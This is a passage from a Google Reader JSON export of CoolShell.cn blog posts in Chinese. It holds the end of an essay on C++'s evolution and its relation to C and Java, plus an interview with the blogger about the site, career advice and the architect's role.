href=\"http://book.douban.com/subject/1096216/\">C++演化和设计</a>》，在这本书中Stroustrup说了些事：</p>\n<p style=\"padding-left:30px\">1）Stroustrup对C是非常欣赏，<strong>实际上早期C++许多的工作是对于C的强化和净化</strong>，并把完全兼容C作为强制性要求。C89、C99中许多的改进正是从C++中所引进。可见，Stroustrup对C语言的贡献非常之大。<strong>今天不管你对C++怎么看，C++的确扩展和进化了C，对C造成了深远的影响</strong>。</p>\n<p style=\"padding-left:30px\">2）Stroustrup对于C的抱怨主要来源于两个方面——在C++兼容C的过程中遇到了不少设计实现上的麻烦；以及守旧的K&amp;R C程序员对Stroustrup的批评。<strong>很多人说C++的恶梦就是要去兼容于C，这并不无道理（</strong>Java就干的比C++彻底得多<strong>）</strong>，但这并不是Stroustrup考虑的，Stroustrup一边在使尽浑身解数来兼容C，另一方面在拼命地优化C。</p>\n<p style=\"padding-left:30px\">3）Stroustrup在书中直接说，C++最大的竞争对手正是C，他的目的就是——<strong>C能做到的，C++也必须做到，而且要做的更好</strong>。大家觉得是不是做到了？有多少做到了，有多少还没有做到？</p>\n<p style=\"padding-left:30px\">4）对于同时关注的运行效率和开发效率的程序员，Stroustrup多次强调C++的目标是——“<strong>在保证效率与C语言相当的情况下，加强程序的组织性；能保证同样功能的程序，C++更短小</strong>”，<strong>这正是<span style=\"color:#ff0000\">浅封装</span>的核心思想</strong>。而不是过渡设计的OO。（参看：<a title=\"面向对象是个骗局？！\" href=\"http://coolshell.cn/articles/3036.html\">面向对象是个骗局</a>）</p>\n<p style=\"padding-left:30px\">5）这本书中举了很多例子来回应那些批评C++有运行性能问题的人。C++在其第二个版本中，引入了虚函数机制，这是C++效率最大的瓶颈了，但我个人认为虚函数就是多了一次加法运算，但让我们的代码能有更好的组织，极大增加了程序的阅读和降底了维护成本。（注：Lippman的《<a href=\"http://book.douban.com/subject/1091086/\">深入探索C++对象模型</a>》也说明了C++不比C的程序在运行性能低。Bruce的《<a href=\"http://book.douban.com/subject/1057170/\">Think in C++</a>》也说C++和C的性能相差只有5%）</p>\n<p style=\"padding-left:30px\">6）这本书中还讲了一些C++的痛苦的取舍，印象最深的就是多重继承，提出，拿掉，再被提出，反复很多次，大家在得与失中不断地辩论和取舍。这个过程让我最大的收获是——a) <strong>对于任何一种设计都有好有坏，都只能偏重一方</strong>，b) <strong>完全否定式的批评是不好的心态，好的心态应该是建设性地批评</strong>。</p>\n<h4>我对C++的感情</h4>\n<p>我先说说我学C++的经历。</p>\n<p>我毕业时，是直接从C跳过C++学Java的，但是<strong>学Java的时候，不知道为什么Java要设计成这样，只好回头看C++，结果学C++的时候又有很多不懂，又只得回头看C</strong>，<strong>最后发现，C -&gt; C++ -&gt; Java的过程，就是C++填C的坑，Java填C++的坑的过程</strong>。</p>\n<p>注，下面这些东西可以看到Java在填C/C++坑：</p>\n<ul>\n<li>Java彻底废弃了指针（指针这个东西，绝对让这个社会有几百亿的损失），使用引用。</li>\n<li>Java用GC解决了C++的各种内存问题的诟病，当然也带来了GC的问题，不过功大于过。</li>\n<li>Java对异常的支持比C++更严格，让编程更方便了。</li>\n<li>Java没有像C++那样的template/macro/函数对象/操作符重载，泛型太晦涩，用OO更容易一些。</li>\n<li>Java改进了C++的构造、析构、拷贝构造、赋值。</li>\n<li>Java对完全抛弃了C/C++这种面向过程的编程方式，并废弃了多重继承，更OO（如：用接口来代替多重继承）</li>\n<li>Java比较彻底地解决了C/C++自称多年的跨平台技术。</li>\n<li>Java的反射机制把这个语言提升了一个高度，在这个上面可以构建各种高级用法。</li>\n<li>C/C++没有一些比较好的类库，比如UI，线程 ，I/O，字符串处理等。（C++0x补充了一些）</li>\n<li>等等……</li>\n</ul>\n<p>当然时代还在前进，这个演变的过程还在C#和Go上体现着。不过我学习了C -&gt; C++  -&gt; Java这个填坑演进的过程，让我明白了很多东西：</p>\n<ul>\n<li>我明白了OO是怎么一回事，重要的是明白了OO的封装，继承，和多态是怎么实现的。（参看我以前写过的《<a href=\"http://blog.csdn.net/haoel/archive/2007/12/18/1948051.aspx\">C++虚函数表解析</a>》和《<a href=\"http://blog.csdn.net/haoel/archive/2008/10/15/3081328.aspx\">C++对象内存布局</a>》）</li>\n<li>我明白了STL的泛型编程和Java的各种花哨的技术是怎么一回事，以及那些很花哨的编程方法和技术。</li>\n<li>我明白了C，C++，Java的各中坑，这就好像玩火一样，我知道怎么玩火不会烧身了。</li>\n</ul>\n<p><span style=\"color:#cc0000\"><strong>我从这个学习过程中得到的最大的收获不是语言本身，而是各式各样的编程技术和方法，和技术的演进的过程，这比语言本身更重要</strong>！</span>（<strong>在这个角度上学习，你看到的不是一个又一个的坑，你看到的是——各式各样让你可以爬得更高的梯子</strong>）</p>\n<p>我对C++的感情有三个过程：先是喜欢地要死，然后是恨地要死，现在的又爱又恨，爱的是这个语言，恨的是很多不合格的人在滥用和凌辱它。</p>\n<h4>C++的未来</h4>\n<p>C++语言发展大概可以分为三个阶段（<a href=\"http://zh.wikipedia.org/wiki/C%2B%2B\">摘自Wikipedia</a>）：</p>\n<ul>\n<li>第一阶段从80年代到1995年。这一阶段C++语言基本上是传统类型上的面向对象语言，并且凭借著接近C语言的效率，在工业界使用的开发语言中占据了相当大份额；</li>\n<li>第二阶段从1995年到2000年，这一阶段由于标准模板库（STL）和后来的Boost等程式库的出现，泛型程式设计在C++中占据了越来越多的比重性。当然，同时由于Java、C#等语言的出现和硬件价格的大规模下降，C++受到了一定的冲击；</li>\n<li>第三阶段从2000年至今，由于以Loki、MPL等程式库为代表的产生式编程和模板元编程的出现，C++出现了发展历史上又一个新的高峰，这些新技术的出现以及和原有技术的融合，使C++已经成为当今主流程式设计语言中最复杂的一员。</li>\n</ul>\n<p>在《<a title=\"Why C++ ? 王者归来\" href=\"http://coolshell.cn/articles/6548.html\">Why C++? 王者归来</a>》中说了 ，性能主要就是要省电，省电就是省钱，在数据中心还不明显，在手机上就更明显了，这就是为什么Android 支持C++的原因。所以，在NB的电池或是能源出现之前，<strong>如果你需要注重程序的运行性能和开发效率，并更关注程序的运性能，那么，应该首选 C++</strong>。这就是iOS开发也支持C++的原因。</p>\n<p><img title=\"\" src=\"http://coolshell.cn//wp-content/uploads/2012/02/WhyCPP.04.jpg\" alt=\"\" width=\"567\" height=\"318\"></p>\n<p>今天的C++11中不但有更多更不错的东西，而且，还填了更多原来C++的坑。（参看：<a href=\"http://zh.wikipedia.org/wiki/C%2B%2B11\">C++11 Wiki</a>，<a title=\"C++11 中值得关注的几大变化（详解）\" href=\"http://coolshell.cn/articles/5265.html\">C++ 11的主要特性</a>）</p>\n<p style=\"text-align:center\"> <img title=\"\" src=\"http://coolshell.cn//wp-content/uploads/2012/02/WhyCPP.11.jpg\" alt=\"\" width=\"567\" height=\"319\"></p>\n<h4><strong>总结</strong></h4>\n<ul>\n<li><strong>C++并不完美，但学C++必然让你受益无穷。</strong></li>\n</ul>\n<ul>\n<li><strong>是那些不合格的、想对编程速成的程序员让C++变得坑多。</strong></li>\n</ul>\n<p>最后，非常感谢能和“<strong>@简悦云风</strong>”，“<strong>@淘宝诸霸</strong>”，“<strong>@Laruence</strong>”一起讨论这个问题！无论你们的观点怎么样，我都和你们“在一起”，嘿嘿嘿……</p>\n<p>(全文完)<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"C++和JAVA传统中积极的一面\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10434907.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">C++和JAVA传统中积极的一面</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"恐怖的C++语言\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1724.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/05/12/8508808.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">恐怖的C++语言</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"中国的C2C模式\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3820.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/06/21/13630825.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">中国的C2C模式</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"C++的字符串格式化库\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3258.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">C++的字符串格式化库</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"C语言的演变史\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1984.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7992.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">C语言的演变史</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table>\n\n<h3>相关文章</h3><ul><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2011年10月14日 -- <a href=\"http://coolshell.cn/articles/5576.html\">那些曾伴我走过编程之路的软件</a></li><li>2011年07月18日 -- <a href=\"http://coolshell.cn/articles/4990.html\">程序员技术练级攻略</a></li><li>2011年06月29日 -- <a href=\"http://coolshell.cn/articles/4905.html\">语言的数据亲和力</a></li><li>2011年06月03日 -- <a href=\"http://coolshell.cn/articles/4758.html\">如何写出无法维护的代码</a></li><li>2011年04月06日 -- <a href=\"http://coolshell.cn/articles/4220.html\">一些有意思的文章和资源</a></li><li>2011年03月29日 -- <a href=\"http://coolshell.cn/articles/4102.html\">如何学好C语言</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345819317298",
    "timestampUsec" : "1345819317298522",
    "id" : "tag:google.com,2005:reader/item/77d00c9507cd6dbe",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "Blog", "CoolShell.cn", "Programmer", "程序员" ],
    "title" : "InfoQ的ArchSummit大会对我的采访",
    "published" : 1344758548,
    "updated" : 1344758548,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8031.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>偷个懒，做个更新，今天下午InfoQ的ArchSummit对我的一些采访。我整理了一下，算做是我个人写酷壳的一些想法和总结。不过问我的这些问题并不尖锐，呵呵，不像<a href=\"http://weibo.com/stonemama\">@图灵谢工</a> 问我的问题：“你的价值观太过理想，根本不现实，你站在道德的高点拷问社会，是不是想炒作自己？”。</p>\n<p><strong>1) 作为酷壳的博主，请您大概介绍下酷壳是什么时候开始的，初衷是什么 ？</strong></p>\n<p>我写blog是从2002年开始（那时还没有blog这个词），当时对我来说，没有自己的电脑，上网很不方便，而我有写学习笔记的习惯，读书和工作中学到的一些东西需要保存在某个地方，我希望这个地方可以让我在任何地方都可以调出来看看（因为我当时的工作出差太多），正好当时的CSDN有个“专家专栏”的功能，也就是后来出现的blog。</p>\n<p>后来Blog出现后，CSDN把自己的“专家专栏”全部迁移到了blog.csdn.net上，07-08年这段时间，CSDN的blog基本上是不能使用，性能差得不能再差，每天宕机，上传图片，贴代码，都非常不好用。也许，这就是使用.NET/Windows平台的问题（开个玩笑）。</p>\n<p>我是从2009年3月开始创建酷壳的，创建的初衷如下：</p>\n<ul>\n<li>我需要一个更稳定，更方便的地方，我的博客的风格不会被大众的风格所掩盖的地方。</li>\n<li>我的从事新闻的老婆很不待见<a href=\"http://blog.csdn.net/haoel\">我在CSDN的博客</a>，她觉得太技术，书呆子。</li>\n<li>我正好看到了煎蛋这个国外娱乐新闻文摘的blog，而我正好每天会有2个小时阅读国外社区的东西。</li>\n</ul>\n<p>基于上述三个原因，我自己花了4500元/年租了个主机，建了酷壳。所以，这也是你一开始看到酷壳基本上是娱乐性比较强的博客，我收集一些比较有意思的程序员中发生的事情，也收集一各式各样的程序员圈子里的各处观点。</p>\n<p>我当时的想法是，一些特别技术的东西，我会和CSDN同步，而一些轻松的话题，我会放在酷壳。我当时的初衷就是想说明程序员并不是一个木纳、书呆子、不食人间烟火、巨无趣的一个群体，程序员圈子里同样也有很多有趣的东西。所以，你可以看到11年初以前的东西我有很多网络恶搞式乱调侃的语言。</p>\n<p><span></span></p>\n<p>但到了2011年初让我开始让我有些转变，主要是读者越来越多，而且，有一些人已经把酷壳当成了一个提升自己能力和、开阔眼界、甚至需要指导的地方，我的压力就这样来了，这种压力让我开始不能太娱乐，因为有一些人是很认真地在看酷壳的文章，在期待能从酷壳获得有价值的东西……</p>\n<p><strong>2）技术人员的个人博客不胜其数，但真正可以吸引人眼球的并不多，能谈谈成功运营一个个人博客的精髓是什么？</strong></p>\n<p>哪有什么运营，完全是顺其自然，误打误撞。</p>\n<p>是的，技术人员的博客太多了，酷壳并不是技术最好的，也不是资讯最好的。淘宝的很多技术团队的博客都很不错，还有阮一峰的博客，还有各种各样的如CSDN，博客园，51CTO，ZDNET这样的社区。所以，我需要做点不一样的，而且我觉得还有一些这些社区和博客都还没有涉及的地方。</p>\n<p>对于社区最大的问题就是，他们就像我们学校里的学生一样，喜欢大量地收获聚集文章和知识，填鸭式的网站，网站的编辑不懂技术。对于一些技术博客的问题并不是他们不懂技术，而是太过技术，只有技术，少了一些程序员的文化，观点和视野。</p>\n<p>程序员是一个圈子，一个小社会，这个圈子里并不只有技术和知识，还有很多很多的东西，例如：程序员们都说自己比较辛苦，都说自己没有得到足够的尊重，还有一些如敏捷，流程，产品等地方程序员的观点没有得到表达，还有一些程序员这个社区内比较特有的东西，比如：编程语言之争，这本是一个很好的话题，是程序员圈子里的文化，但是每次讨论都是骂来骂去的，需要有人去引导程序员，带领他们用正确的价值观去看待和思考这些东西。</p>\n<p>这就是酷壳和其它博客和社区不一样的地方，我关注的并不只有技术，还有程序员的文化和想法，并且输出一些或偏执或鲜明或个人或激进的价值观，无论怎么样，你认同也好，不认同也可以，你可以看到酷壳和我还有酷壳里的讨论都是真实的。</p>\n<p><strong>3）根据你博客的自我介绍，想从纯底层技术方向转型为业务技术方向，让你产生这种想法的最大原因是什么？</strong></p>\n<p>纯底层做得太多了，有些书呆子了，与人打交道有问题了，而且觉得地底有点不识人间烟火了，我想知道用户是怎么用我们的产品的，我想知道用户是怎么想的，整天在那调网络性能，调系统性能，搞多线程，搞内存漏洞，整天在矿道里打洞， 想出来见见天日。呵呵。</p>\n<p>但这并不代码我觉得业务和用户要比技术有用得多，也并不是说技术无用论。</p>\n<p>我觉得这就好像一颗大树，这些底层的技术，可以让你站得非常非常稳，可以让你抵御洪灾和暴风，但是如果你想伸长得更高更广，你还是需要地面上的枝叶。我觉得我的底层知识够深入了，我需要了解业务知识和用户，因为我不但想站得稳，扎得深，我也想伸得高。</p>\n<p><strong>4）酷壳产出文章是怎么样的频率？每篇博文 ，你大概需要多少时间？</strong></p>\n<p>我每天都有阅读的习惯，尤其是阅读网文，每天两个小时，而且我是一个爱思考的人，思考的对不对不一定，但是我很喜欢去思考。现在又上了微博和一些朋友互动，也会引发我的一些思考，所以，文章就是在阅读、交流和思考中产生的。</p>\n<p>2011年初以前，平均每周3篇，有时候一周有10篇，现在基本上每周一篇。以前的文章花不了太多时间 ，因为比较娱乐，现在的文章很花时间，比如《程序员练级攻略》花了我四周的时间 ，《性能调优攻略》花了我三周多的时间，基本上来说，现在的文章至少也要花我1-2天的时间。我想把文章的数量降下来，这样，我可以思考得更好更透彻一些，这样文章里的营养更多一些。</p>\n<p><strong>5）是不是可以给年轻的朋友，或是风刚从事软件开发工作的朋友，一些职业发展的建议？</strong></p>\n<p>主要是下面几点：</p>\n<ul>\n<li>不要追新技术，应该多看看那些经历了很长时间的常青的技术。</li>\n</ul>\n<ul>\n<li>多研究一下历史，和技术的演进，这样你才能知道技术的未来。今天的很多东西都在过去有身影，如：今天的移动端和云端架构和以前的Unix和终端的关系，还有管道，和Unix设计的哲学也在今天Service Interface式的设计中有得到传承，等等。</li>\n</ul>\n<ul>\n<li>我可以急功近利以解决问题和追赶技术潮流，但是，如果你需要成为一个领域的专家，你需要非常非常注重基础。速成编程的方式只能让你成为劳动力，而不能成为工匠或技术和知识的驾驭者。</li>\n</ul>\n<ul>\n<li>不要被产商的文化所主导了，多看看社区的文化，尤其是Unix/C的文化，这是计算机文化的根（参看我写过的《<a title=\"Unix传奇(上篇)\" href=\"http://coolshell.cn/articles/2322.html\">Unix传奇</a>》）</li>\n</ul>\n<ul>\n<li>注重基础，广度是深度是副产品。</li>\n</ul>\n<p><strong>6）以你过往的经历，你是如何看待“架构师”这个角色的？他的义务是如何分配的？</strong></p>\n<p>架构就是Design一个部分，就是软件设计的一块，软件设计最重要的有两点：</p>\n<ul>\n<li>业务功能性需求分析和非功能性需求分析，</li>\n<li>技术基础的深刻认识，需要有非常丰富的经验。</li>\n</ul>\n<p>试问一下，程序员做软件不需要设计吗？做设计不需要设计架构吗？很自然的，今天的工程师，程序员已经在做架构设计上的事了。所以，我觉得架构设计这个工作本就是程序员（或者说是高级程序员）工作的一部分。</p>\n<p>但是，我个人认为架构师在某些情况下也还是需要的，但其应该是对业务和技术都很熟悉的人，并且偏技术，也要写代码的人。在一些公司，上下一盘棋，的确需要对总体架构设计，并保证这个框架能够被各个工程团队贯彻实现的那么一个团队，但他们应该更多地深入到一线工程团队的。</p>\n<p>所以，我觉得架构师就是一个高级程序员，而不是一个拍脑袋，关说不练的人。</p>\n<p>这点，看看Linux的架构师团队就知道了，一样的需要写代码，fix-bug，一样地需要了解各个公司对linux提出的各种各样的需求。</p>\n<p><strong>7）现阶段酷壳的文章，都是你一个人写的吗？是否有其他同仁加入写作？</strong></p>\n<p>并不都是我一个人写的，我希望酷壳是大家一起来写的，事实上也有一些人写，只是不多。只是我个人的色彩过重了一些，我的个性压制了众性。</p>\n<p>（不过，我真的无法自证都是我写的，我有没有团队，呵呵，管它有没有团队，是不是人代写，重要的是那些文章的内容是否对大家有帮助，或是对社区有贡献。；））</p>\n<p><strong>8）你对酷壳未来的构想是什么？还是一个技术交流的平台吗？</strong></p>\n<p>对于酷壳来说，其文化和价值观比较重一些，短期内，还是以我个人色彩为主一些，虽然我希望这是一个大家都能来分享的地方。前段时间我有个想法想做一个“程序员疫苗站”，就像我们一出生时接种的各种疫苗可以让我们抵抗各种病毒一样，这个网站可以让程序员接种一些犯低级错误的疫苗，从而对这些低级错误有抵抗。我还没有想得特别清楚，不过方向基本上是这个方面的。</p>\n<p>（全文完）</p>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"对九个超级程序员的采访\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8275.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8031.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">对九个超级程序员的采访</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Emacs配色在线生成器\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F2271.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8031.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/08/25/24977035.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Emacs配色在线生成器</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"十个开源的Javascript框架\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F91.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8031.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2012/08/09/40113232.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">十个开源的Javascript框架</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"程序语言性能比拼\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1788.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8031.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/11/08/10437880.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">程序语言性能比拼</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"消费者的消费观\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F2913.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8031.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/06/21/13669988.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">消费者的消费观</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table>\n\n<h3>相关文章</h3><ul><li>2012年10月16日 -- <a href=\"http://coolshell.cn/articles/8398.html\">xkcd 神图“Click and Drag”</a></li><li>2012年10月14日 -- <a href=\"http://coolshell.cn/articles/8387.html\">Bret Victor – Learnable Programming</a></li><li>2012年09月14日 -- <a href=\"http://coolshell.cn/articles/8275.html\">对九个超级程序员的采访</a></li><li>2012年08月27日 -- <a href=\"http://coolshell.cn/articles/8170.html\">一次Ajax查错的经历</a></li><li>2012年08月22日 -- <a href=\"http://coolshell.cn/articles/8138.html\">为什么我反对纯算法面试题</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2012年04月27日 -- <a href=\"http://coolshell.cn/articles/7186.html\">做个环保主义的程序员</a></li></ul>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1345819314603",
    "timestampUsec" : "1345819314603558",
    "id" : "tag:google.com,2005:reader/item/87e3728d0787878d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "杂项资源", "编程语言", "C++", "Java", "Linux", "Programmer", "Unix", "程序员" ],
    "title" : "对技术的态度",
    "published" : 1345132225,
    "updated" : 1345132225,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/8088.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
